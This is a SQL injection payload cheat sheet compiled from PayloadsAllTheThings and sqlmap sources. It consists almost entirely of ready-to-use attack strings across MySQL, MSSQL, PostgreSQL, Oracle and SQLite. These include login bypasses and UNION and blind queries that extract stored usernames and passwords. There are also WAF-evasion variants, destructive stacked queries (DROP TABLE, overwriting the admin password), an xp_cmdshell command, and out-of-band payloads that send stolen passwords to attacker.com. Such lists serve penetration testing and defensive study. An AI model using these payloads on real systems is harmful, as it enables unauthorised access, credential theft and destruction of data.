# SQL Injection Payloads

Source: PayloadsAllTheThings, sqlmap wiki, security community

---

## Detection & Entry Points

### Basic Test Characters
```sql
'
"
;
)
*
```

### Encoded Test Characters
```
%27      (')
%22      (")
%23      (#)
%3B      (;)
%29      ())
%2A      (*)
%%2727   (double encoded ')
%25%27   (encoded %27)
```

### Unicode Characters
```
%CA%BA   (U+02BA) → transforms to "
%CA%B9   (U+02B9) → transforms to '
```

### Merging Characters
```sql
`+HERP
'||'DERP
'+'herp
' 'DERP
'%20'HERP
'%2B'HERP
```

---

## DBMS Detection

### MySQL
```sql
conv('a',16,2)=conv('a',16,2)
connection_id()=connection_id()
crc32('MySQL')=crc32('MySQL')
```

### MSSQL
```sql
BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)
@@CONNECTIONS=@@CONNECTIONS
@@CPU_BUSY=@@CPU_BUSY
USER_ID(1)=USER_ID(1)
```

### Oracle
```sql
ROWNUM=ROWNUM
RAWTOHEX('AB')=RAWTOHEX('AB')
LNNVL(0=123)
```

### PostgreSQL
```sql
5::int=5
5::integer=5
pg_client_encoding()=pg_client_encoding()
get_current_ts_config()=get_current_ts_config()
quote_literal(42.5)=quote_literal(42.5)
current_database()=current_database()
```

### SQLite
```sql
sqlite_version()=sqlite_version()
last_insert_rowid()=last_insert_rowid()
```

---

## Authentication Bypass

### Generic
```sql
' OR '1'='1' --
' OR 1=1--
' OR 1=1#
' OR 1=1/*
admin'--
admin'#
admin'/*
' or '1'='1'/*
'=' 'or'
```

### Comment Variations
```sql
' OR 1=1 -- -
' OR 1=1 #
' OR 1=1 //
' OR 1=1 /*
' OR 1=1;%00
```

---

## UNION Based Injection

### Number of Columns Discovery
```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--

' UNION SELECT null--
' UNION SELECT null,null--
' UNION SELECT null,null,null--
```

### Data Extraction (MySQL)
```sql
' UNION SELECT 1,2,3--
' UNION SELECT 1,database(),3--
' UNION SELECT 1,user(),3--
' UNION SELECT 1,version(),3--
' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--
' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT 1,group_concat(username,':',password),3 FROM users--
```

### Data Extraction (PostgreSQL)
```sql
' UNION SELECT null,null--
' UNION SELECT current_database(),null--
' UNION SELECT current_user,null--
' UNION SELECT version(),null--
' UNION SELECT string_agg(table_name,','),null FROM information_schema.tables WHERE table_schema='public'--
```

### Data Extraction (MSSQL)
```sql
' UNION SELECT 1,2,3--
' UNION SELECT DB_NAME(),2,3--
' UNION SELECT SYSTEM_USER,2,3--
' UNION SELECT @@version,2,3--
' UNION SELECT name,2,3 FROM master.dbo.sysdatabases--
```

---

## Error Based Injection

### MySQL
```sql
' AND 1=CONVERT(int, (SELECT @@version))--
' AND extractvalue(rand(),concat(0x3a,(SELECT version())))--
```

### MSSQL
```sql
' AND 1=@@version--
' AND 1=(SELECT @@version)--
' AND 1=CONVERT(int,(SELECT @@version))--
```

### PostgreSQL
```sql
' AND 1=cast((SELECT version()) as int)--
' AND 1=cast((SELECT current_database()) as int)--
```

### Oracle
```sql
' AND 1=utl_inaddr.get_host_name((SELECT banner FROM v$version WHERE rownum=1))--
```

---

## Blind Injection

### Boolean Based

**True/False Testing:**
```sql
' AND 1=1--
' AND 1=2--
' AND 'a'='a'--
' AND 'a'='b'--
```

**Substring Extraction:**
```sql
' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'--
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--
```

### Time Based

**MySQL:**
```sql
' AND SLEEP(5)--
' AND IF(1=1,SLEEP(5),0)--
' AND (SELECT SLEEP(5) FROM dual WHERE database() LIKE '%')--
```

**PostgreSQL:**
```sql
' AND pg_sleep(5)--
' AND (SELECT pg_sleep(5))--
' AND CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--
```

**MSSQL:**
```sql
' WAITFOR DELAY '0:0:5'--
' IF (1=1) WAITFOR DELAY '0:0:5'--
```

**Oracle:**
```sql
' AND 1=dbms_pipe.receive_message('RDS',5)--
```

**SQLite:**
```sql
' AND randomblob(1000000000)--
```

### Out of Band (OAST)

**MySQL:**
```sql
' AND LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users LIMIT 1),'.attacker.com\\a.txt'))--
```

**PostgreSQL:**
```sql
' AND (SELECT dblink_connect('host=attacker.com user=a password=a dbname='||(SELECT password FROM users LIMIT 1)))--
```

**MSSQL:**
```sql
';exec master..xp_dirtree '\\attacker.com\a'--
```

---

## Stacked Queries

### MySQL
```sql
'; DROP TABLE users; --
'; INSERT INTO users VALUES ('attacker','password'); --
'; UPDATE users SET password='hacked' WHERE username='admin'; --
```

### PostgreSQL
```sql
'; SELECT pg_sleep(5); --
```

### MSSQL
```sql
'; WAITFOR DELAY '0:0:5'; --
'; EXEC xp_cmdshell 'whoami'; --
```

---

## WAF Bypass

### No Space Allowed
```sql
'/**/OR/**/1=1--
'+(select*from(select(sleep(5)))a)+'
'OR(1)=(1)--
```

### No Comma Allowed
```sql
' union select * from (select 1)a join (select 2)b join (select 3)c--
```

### No Equal Allowed
```sql
' OR 1 LIKE 1--
' OR 1 BETWEEN 1 AND 1--
' OR 1 IN (1)--
```

### Case Modification
```sql
' Or 1=1--
' oR '1'='1
SeLeCt * FrOm users
```

### Comment Variations
```sql
'/**/OR/**/1=1--
'/*!50000OR*/1=1--
' OR 1=1;%00
```

---

## Polyglot Injection

Works across multiple contexts:
```sql
' OR '1'='1' /*
' OR '1'='1' #
' OR 1=1-- -
```

---

## Second Order SQL Injection

Payloads stored in database and executed later:
```sql
username: admin'--
email: victim@email.com' OR '1'='1
comment: test'; DROP TABLE comments; --
```

---

## References

- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
- https://github.com/sqlmapproject/sqlmap/wiki/Usage
- https://portswigger.net/web-security/sql-injection
